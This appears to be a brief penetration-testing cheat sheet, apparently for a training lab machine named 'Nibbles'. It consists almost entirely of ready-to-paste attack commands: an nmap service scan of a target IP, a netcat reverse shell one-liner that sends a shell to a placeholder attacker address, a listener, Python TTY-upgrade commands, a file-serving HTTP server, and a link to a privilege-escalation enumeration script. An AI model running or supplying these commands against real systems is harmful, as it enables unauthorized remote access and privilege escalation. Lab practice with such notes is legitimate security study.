Enumeration
```shell-session
nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
```
Reverse shell
````shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
````
Connecting to a reverse shell:
````shell-session
nc -lvnp <PORT>
````
Getting interactive TTY:
````bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
````
Run python server:
`sudo python3 -m http.server 8080`
Tool for automating privilege escalation:
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
